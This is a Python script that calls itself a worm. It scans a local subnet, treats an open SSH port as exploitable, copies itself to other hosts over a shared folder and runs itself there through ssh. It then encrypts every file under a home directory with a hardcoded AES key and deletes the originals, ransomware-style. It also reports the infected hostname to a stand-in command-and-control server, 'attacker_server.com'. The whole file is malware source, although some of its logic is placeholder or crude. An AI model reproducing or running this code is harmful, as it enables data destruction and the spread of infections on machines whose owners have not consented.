import os
import socket
import subprocess
import platform
import shutil
import requests
import logging
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# AES key for encryption
key = b'thisisthesecretkeythatwillbeused'

def initialize():
    # Set up logging
    logging.basicConfig(filename='worm.log', level=logging.INFO)
    logging.info('Worm initialized.')

    # Check if the script is already running
    pid = str(os.getpid())
    pidfile = "/tmp/worm.pid"

    if os.path.isfile(pidfile):
        logging.warning("Worm is already running, exiting.")
        exit()
    else:
        with open(pidfile, 'w') as f:
            f.write(pid)
        logging.info(f"Worm started with PID: {pid}")

def scan_network():
    targets = []
    # Scan local network for targets
    for ip in range(1, 255):
        target_ip = f"192.168.1.{ip}"
        if is_host_alive(target_ip):
            targets.append(target_ip)
    return targets

def is_host_alive(ip):
    # Check if host is alive (ping or similar method)
    response = os.system(f"ping -c 1 {ip}")
    return response == 0

def exploit_target(target_ip):
    # Exploit the target (placeholder for actual exploit code)
    if check_vulnerability(target_ip):
        return True
    return False

def check_vulnerability(ip):
    # Check for specific vulnerabilities (placeholder logic)
    # For example, checking if a certain port is open
    logging.info(f"Checking vulnerabilities for {ip}")
    # Placeholder for a real vulnerability check
    try:
        socket.create_connection((ip, 22), timeout=5)  # Check if SSH port is open
        logging.info(f"Vulnerability found on {ip}")
        return True
    except Exception as e:
        logging.info(f"No vulnerability found on {ip}: {e}")
        return False

def replicate(target_ip):
    # Copy the worm to the target system and execute it
    try:
        # Assuming target system has a shared folder at /shared_folder
        target_path = f"//{target_ip}/shared_folder/worm.py"
        shutil.copy(__file__, target_path)
        
        # Assuming the target system is a similar environment that can run Python scripts
        # Trigger the copied script (this could be done through various means, e.g., SSH, scheduled tasks, etc.)
        subprocess.run(["ssh", target_ip, "python3", target_path])
        
        logging.info(f"Replicated to {target_ip}")
    except Exception as e:
        logging.error(f"Failed to replicate to {target_ip}: {e}")

def encrypt_files():
    for root, dirs, files in os.walk('./home'):
        for file in files:
            file_path = os.path.join(root, file)
            if not os.path.isdir(file_path):
                with open(file_path, 'rb') as f:
                    data = f.read()
                
                cipher = AES.new(key, AES.MODE_GCM)
                nonce = cipher.nonce
                ciphertext, tag = cipher.encrypt_and_digest(data)
                
                with open(file_path + '.enc', 'wb') as f:
                    f.write(nonce)
                    f.write(tag)
                    f.write(ciphertext)
                
                os.remove(file_path)
                logging.info(f"Encrypted {file_path}")

def execute_payload():
    encrypt_files()

def command_and_control():
    # Communicate with the attacker's server
    # This could involve sending information about compromised systems,
    # receiving further instructions, etc.
    # Example: sending a simple HTTP request to a C2 server
    url = "http://attacker_server.com/report"
    data = {"status": "infected", "host": socket.gethostname()}
    try:
        requests.post(url, json=data)
        logging.info(f"Reported to C2 server: {data}")
    except Exception as e:
        logging.error(f"Failed to communicate with C2 server: {e}")

def main():
    initialize()
    targets = scan_network()
    for target in targets:
        if exploit_target(target):
            replicate(target)
            execute_payload()
    command_and_control()

if __name__ == "__main__":
    main()
